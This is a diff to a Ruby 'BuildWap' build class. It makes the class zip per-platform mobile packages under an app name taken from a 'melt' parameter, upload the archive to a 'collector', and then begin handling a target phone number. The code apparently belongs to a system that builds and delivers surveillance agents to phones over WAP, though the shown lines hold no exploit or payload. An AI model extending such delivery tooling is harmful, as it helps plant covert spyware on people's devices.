@@ -32,6 +32,7 @@ class BuildWap < Build
 
     # don't include support files into the outputs
     @outputs = []
+    @appname = params['melt']['appname']
 
     raise "don't know what to build" if params['platforms'].nil? or params['platforms'].empty?
 
@@ -62,7 +63,7 @@ class BuildWap < Build
           outs.keep_if {|o| o['.apk']}
         when 'symbian'
           outs.keep_if {|o| o['.sisx']}
-          outs.delete_if {|o| o['5th'] or o['3rd']}
+          outs.delete_if {|o| o['5th'] or o['3rd'] or o['symbian3']}
         when 'winmo'
           outs.keep_if {|o| o['.cab']}
       end
@@ -81,10 +82,17 @@ class BuildWap < Build
   def deliver(params)
     trace :debug, "Build: deliver: #{params} #{@outputs}"
 
-    @outputs.each do |o|
-      content = File.open(path(o), 'rb') {|f| f.read}
-      Frontend.collector_put(o, content)
+    # zip all the outputs and send them to the collector
+    # it will create a subdir automatically
+    Zip::ZipFile.open(path("#{@appname}.zip"), Zip::ZipFile::CREATE) do |z|
+      @outputs.each do |o|
+        z.file.open("#{o}", "wb") { |f| f.write File.open(path(o), 'rb') {|f| f.read} }
+      end
     end
+
+    # send only this file to the collector
+    content = File.open(path("#{@appname}.zip"), 'rb') {|f| f.read}
+    Frontend.collector_put("#{@appname}.zip", content)
 
     # sanitize the phone number (no + and no 00 )
     number = params['number']
